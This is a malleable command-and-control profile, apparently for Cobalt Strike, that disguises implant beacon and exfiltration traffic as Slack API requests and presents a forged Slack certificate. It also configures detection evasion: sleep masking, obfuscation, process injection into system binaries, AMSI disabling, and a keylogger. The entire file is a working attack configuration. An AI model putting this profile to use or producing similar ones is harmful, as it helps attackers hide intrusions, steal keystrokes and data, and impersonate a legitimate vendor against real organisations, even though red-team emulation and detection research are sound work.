# =====================================================================
# Profile: Slack Enterprise Webhooks & Polling - STEALTH
# Generated & Validated by Ostad Red Team Forge Malleable C2 Engine
# Founder & Director: Ostad Rezaul Karim (Top 1% Red Teamer)
# =====================================================================

set sample_name "update_CZJTID.exe";
set sleeptime "5000";
set jitter "25";
set maxget "1048576";
set data_jitter "10";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36";
set pipename "eventlog_##";
set pipename_stager "status_WLd7##";


http-get {
    set uri "/api/conversations.history" "/api/rtm.connect";

    client {
        header "Host" "slack.com";
        header "Accept" "application/json, text/javascript, */*; q=0.01";
        header "Accept-Language" "en-US,en;q=0.9";
        header "X-Slack-Req-Id" "9b8e23f1-33cb-4dbb-8215-618451892182";
        metadata {
            mask;
            base64url;
            prepend "channel=";
            header "Cookie";
        }
    }

    server {
        header "Server" "Apache";
        header "Content-Type" "application/json";
        header "Cache-Control" "no-cache, no-store, must-revalidate";
        output {
            mask;
            base64;
            print;
        }
    }
}

http-post {
    set uri "/api/views.publish" "/api/chat.postMessage";
    set verb "POST";

    client {
        header "Host" "slack.com";
        header "Accept-Language" "en-US,en;q=0.9";
        header "X-Slack-Req-Id" "9b8e23f1-33cb-4dbb-8215-618451892182";
        header "Content-Type" "application/json";
        id {
            mask;
            base64url;
            parameter "session";
        }
        output {
            mask;
            base64url;
            print;
        }
    }

    server {
        header "Server" "Apache";
        header "Content-Type" "application/json";
        output {
            mask;
            base64;
            print;
        }
    }
}

stage {
    set checksum "0";
    set cleanup "true";
    set sleep_mask "true";
    set smartinject "true";
    set stomppe "true";
    set obfuscate "true";
    set userwx "false";
    set magic_mz_x86 "MZRV";
    set magic_mz_x64 "MZRV";
    set magic_pe "PO";
    transform-x86 {
        prepend "\x90\x90\x90\x90";
    }
    transform-x64 {
        prepend "\x90\x90\x90\x90";
    }
}

process-inject {
    set allocator "VirtualAllocEx";
    set min_alloc "16384";
    set startrwx "false";
    set userwx "false";
    execute {
        CreateThread;
        SetThreadContext;
        CreateRemoteThread;
        RtlCreateUserThread;
    }
}

post-ex {
    set spawnto_x86 "%windir%\syswow64\runtimebroker.exe";
    set spawnto_x64 "%windir%\sysnative\dllhost.exe";
    set amsi_disable "true";
    set keylogger "GetAsyncKeyState";
}

https-certificate {
    set CN "*.slack.com";
    set O "Slack Technologies LLC";
    set OU "Engineering";
    set C "US";
    set ST "CA";
    set L "San Francisco";
    set validity "594";
}
